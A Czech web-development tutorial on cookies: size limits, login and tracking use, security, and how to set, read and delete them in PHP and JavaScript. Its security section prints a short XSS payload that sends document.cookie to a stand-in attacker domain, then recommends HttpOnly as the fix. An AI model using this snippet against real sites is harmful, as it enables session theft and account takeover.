---
title: "Cookies"
headline: "Cookies"
description: "Kdy cookies (ne)používat a jak s nim pracovat v JavaScriptu a PHP."
date: "2014-02-15"
last_modification: "2015-10-15"
status: 1
tags: ["js", "php"]
format: "html"
---

<p><b>Cookies</b> (česky <i>sušenky</i>) jsou malé soubory ukládané na straně klienta v prohlížeči.</p>

<p>Jedná se o nejstarší a nejlépe podporovaný způsob ukládání dat u návštěvníka. Tato data se odesílají při požadavku na server, což z nich dělá ideální nástroj pro <b>identifikaci</b>. Proto se většina přihlášení na webových stránkách bez cookie neobejde.</p>

<p><img src="/files/cookies/fb-login.png" alt="Přihlášení na Facebooku bez cookies" class="border"></p>








<p>Méně domyšlené aplikace na <b>nemožnost nastavit cookie</b> vůbec neupozorňují a bez sušenek se tak z <i>neznámých důvodů</i> nejde přihlásit.</p>


<div class="internal-content">
  <ul>
    <li><a href="/vypnute-cookies">Zjištění vypnutých cookies</a> – jak zjistit, jestli má návštěvník zapnuté nebo vypnuté cookies</li>
  </ul>
</div>

<p>Kromě přihlašování uživatelů se cookies hojně používají pro jejich <b>sledování</b>. Cookie tak používají měřicí skripty jako je <a href="/ga">Google Analytics</a> nebo různé reklamní systémy pro lepší cílení reklam.</p>


<h2 id="velikost">Velikost cookies</h2>

<p>Z dnešního pohledu je hlavním omezení v používání cookies jejich <b>omezená velikost</b>.</p>

<p>Při všech HTTP požadavcích se <b>odesílají na server</b> – to limituje jejich velikost a zvětšuje objem přenášených dat.</p>
    
<p><b>Bezpečná velikost</b> napříč prohlížeči je <b>4 kB</b> pro všechny cookies na dané doméně, bezpečný maximální počet sušenek je <b>20</b>. Novější prohlížeče mají limity velkorysejší. Do velikosti se kromě samotné <b>hodnoty</b> započítává i název cookie, nastavení expirace a podobně.</p>
    
    <div class="external-content">
      <ul>
        <li><a href="http://browsercookielimits.squawky.net/">Browser Cookie Limits</a> – limity v současných prohlížečích</li>
      </ul>
    </div>
    
    <p>Kvůli nepotřebnosti přenášení sušenek se někdy servírují statické soubory (styly, skripty, obrázky), které cookies k ničemu nevyžadují, z jiné domény.</p>






<h2 id="pouzivat">Kdy používat cookie</h2>

<p>V dnešní době je prakticky jediný rozumný případ užití sušenek <b>identifikace uživatele</b> mezi klientem a serverem. Nebo funkce <b>trvalé přihlášení</b>.</p>



<p>Po ověření přihlašovacích údajů se v prohlížeči uloží identifikátor, který se následně posílá s každým požadavkem. Server podle toho pozná, kdo je přihlášen a pošle mu příslušná data.</p>

<p>Přes <i>cookies</i> typicky fungují i <a href="http://pehapko.cz/programujeme-v-php/sessions"><i>session</i> v PHP</a>. V prohlížeči je cookie s názvem  <code>PHPSESSID</code>, kde je hodnota propojující prohlížeč s daty na serveru.</p>


<p>Pro případy, kdy není nutné cookie neustále odesílat na server, je lepší používat <b>lokální úložiště</b>.</p>



<div class="internal-content">
  <ul>
    <li><a href="/localstorage">Úložiště <code>localStorage</code></a> – úložiště v prohlížeči klienta přístupné JavaScriptem</li>
  </ul>
</div>

<p>Do toho se vejde více dat, takže je vhodné pro věci jako je ukládání <b>lokálního nastavení stránky</b> nebo <a href="/zalohovani-formularu">zálohy rozepsaných formulářů</a>. V případě potřeby se potom může jeho obsah přenést na server <a href="/ajax">AJAXem</a>.</p>

<p>Teoreticky by šly cookies vyměnit za <code>localStorage</code>, ale bylo by to zbytečně <a href="/bez-javascriptu">závislé na JavaScriptu</a>. Nezávislost na JS je drobná výhoda cookies oproti lokálnímu úložišti.</p>


<h2 id="bezpecnost">Bezpečnost cookies</h2>

<p>Jelikož jsou cookies uloženy na disku uživatele, kdokoliv se k jeho počítači dostane, může se potom <b>kdekoliv přihlásit</b>, aniž by znal heslo.</p>



<p>Některé služby se tomuto problému snaží předcházet tak, že každá cookie pro trvalé přihlášení je platná pouze pro daný prohlížeč. Jednotlivé prohlížeče v kombinaci s operačním systémem, nainstalovanými pluginy a fonty vytváří relativně <b>unikátní otisk</b>, který jde ověřovat.</p>


<p>Často ale vítězí pohodlí uživatelů, kteří typicky dávají přednost zbytečnému neodhlašování před snížením risika krádeže cookie.</p>



<h3 id="kradez-js">Krádež cookie JavaScriptem</h3>

<p>Zjistit cookie potřebnou pro přihlášení jde někdy i pomocí JS. Pokud se na cizí stránku podaří propašovat vlastní JS kód, může jít získat cookie přihlášeného uživatele:</p>


<div class="internal-content">
  <ul>
    <li><a href="/xss">Využití XSS chyby</a> – jak je možné využít XSS díru na webové stránce </li>
  </ul>
</div>

<p>Cookie si lze snadno přenést na vlastní server.</p>

<pre><code>var ping = new Image();
ping.src = "http://domena-utocnika.cz/?" + 
            encodeURI(document.cookie);</code></pre>





<p>Kromě opravení XSS díry je řešení nastavit sušenky jako <code>HttpOnly</code>. Potom se k nim JavaScript vůbec nedostane.</p>


<h2 id="prohlizeni">Jak zobrazit cookie?</h2>

<p>Podívat se na cookie, které jsou pro danou stránku nastaveny, jde ve <a href="/vyvojarske-nastroje">vývojářských nástrojích</a> (klávesa <kbd>F12</kbd>).</p>

<p>V <b>Chrome</b> jsou na kartě <i>Resources</i>:</p>

<p><img src="/files/cookies/prehled-cookies.png" alt="Přihlášení na Facebooku bez cookies" class="border"></p>






















<p>Sušenky tam jde pouze mazat. Pro upravování je potřeba rozšíření. Na obrázku jsou cookies, které přidává Google Analytics.</p>


<h2 id="testovani">Testování</h2>

<p>Jelikož cookies ovlivňují chování aplikace, může se při vývoji stát, že se stránka bude chovat neočekávávaně. Na vině mohou být dříve nastavené sušenky se špatnou hodnotou.</p>

<p>Proto je dobré čas od času cookies promazat nebo <b>aplikaci otevřít v anonymním okně</b> – <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>N</kbd> v <b>Chrome</b>/<b>Opeře</b> a <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>P</kbd> pro <b>Firefox</b>/<a href="/microsoft-edge"><b>Edge</b></a>.</p>

<p>U anonymního okna si je třeba uvědomit, že otevření další záložky už bude vidět cookie vytvořené v první záložce, takže i anonymní okno je potřeba občas otevřít znovu.</p>


<h2 id="php">Cookies v PHP</h2>

<p>Cookie se v PHP nastaví funkcí <code><a href="http://www.php.net/manual/en/function.setcookie.php">setcookie</a></code>:</p>

<pre><code>setcookie(
  "nazev-cookie", 
  $hodnota,
  strtotime('+1 years')
);</code></pre>





<p>První parametr je název, druhý hodnota cookie a třetí <b>platnost</b>. Platnost je nepovinná, ale bez jejího uvedení cookie zanikne po zavření prohlížeče. Nastavení platnosti jde provést docela elegantně funkcí <code>strtotime</code>.</p>

<p>Nepovinná je i hodnota sušenky.</p>

<p>Dále jde uvést ještě cestu a doménu, kde sušenka platí, funkčnost jen na <a href="/https">HTTPS</a> a příznak <code>httponly</code>, aby se ke cookie nedalo dostat JavaScriptem.</p>


<pre><code>setcookie(
  "nazev-cookie", 
  $hodnota,
  strtotime('+1 years'), // platnost
  "", // path
  "", // domain
  false, // HTTPS
  <b>true</b> // httponly
);</code></pre>











<p>Nastavit chování sušenek globálně jde funkcí <code><a href="http://www.php.net/manual/en/function.session-set-cookie-params.php">session_set_cookie_params</a></code>.</p>

<h3 id="cteni">Přečtení cookie v PHP</h3>

<p>Sušenky jsou potom přístupné v poli <code>$_COOKIE</code>.</p>

<pre><code>&lt;?php echo $_COOKIE["nazev"] ?></code></pre>





<h3 id="php-smazani">Smazání cookie</h3>

<pre><code>setcookie("nazev", "", 1);</code></pre>


<h2 id="js">Cookies v JavaScriptu</h2>

<p>V JS prakticky není důvod cookie používat. Snad jen kvůli jejich snadnému a automatickému přenášení na server v situaci, kdy <b>nepřenesení dat není kritické</b>.</p>


<p>Po nastavení cookie JavaScriptem je totiž ještě nutné provést HTTP požadavek, aby se informace přenesla na server.</p>

<p>Lepší je používat <a href="/localstorage"><code>localStorage</code></a>, které není tak datově limitující, nemá omezenou dobu platnosti a má pohodlnější rozhraní pro používání.</p>





<h3 id="nastaveni">Nastavení cookie v JS</h3>

<p>Vytvoření cookie v prostém JS s dlouhou platností vypadá následovně:</p>

<pre><code>document.cookie = 
  "nazev=hodnota; expires=Fri, 31 Dec 9999 23:59:59 GMT";</code></pre>



<p>Ne všechny prohlížeče nastaví této cookie platnost na rok 9999.</p>


<p>Pokud se má cookie smazat po zavření prohlížeče, nemusí se expirace uvádět:</p>

<pre><code>document.cookie = "nazev=hodnota";</code></pre>




<h3 id="smazani">Smazání cookie</h3>

<p>Smazání proběhne nastavením expirace do minulosti.</p>

<pre><code>document.cookie = 
  "nazev=; expires=Thu, 01 Jan 1970 00:00:00 GMT";</code></pre>




<h3 id="precteni">Přečtení cookie v JS</h3>

<p>Nejkomplikovanější je získat hodnotu cookie podle názvu.</p>

<p>Rychlé a ne 100% spolehlivé řešení na testování přítomnosti cookie je:</p>

<pre><code>if (document.cookie.indexOf("nazev=hodnota") == -1) {
  // cookie „nazev“ s hodnotou „hodnota“ neexistuje
}
else {
  // existuje
}</code></pre>










<p>Pro získání konkrétní hodnoty je potom nutné projít řetězec obsahující všechny cookie na stránce, ten vypadá nějak takto:</p>

<pre><code>nazev=hodnota; nazev2=hodnota2</code></pre>

<p>Nezbývá tedy než řetězec rozsekat podle „<code>; </code>“, projít <a href="/js-cykly">cyklem</a>, rozdělit podle „<code>=</code>“ a porovnat z názvem a případně vrátit hodnotu:</p>

<pre><code>function precistCookie(nazev) {
    var susenky = document.cookie.split("; ");
    for (var i in susenky) {
        susenka = susenky[i].split("=");
        if (susenka[0] == nazev) {
            return susenka[1];
        }
    }
    return false;
}</code></pre>










<h3 id="hotove-reseni">Pokročilejší hotové řešení</h3>

<p>Pro pohodlnější práci s cookie jde použít menší framework z MDN:</p>

<div class="external-content">
  <ul>
    <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/document/cookie#A_little_framework_a_complete_cookies_readerwriter_with_full_unicode_support">A little framework: a complete cookies reader/writer with full unicode support</a></li>
  </ul>
</div>


<!-- test nastavení a výpis cookie: http://kod.djpw.cz/ferb- -->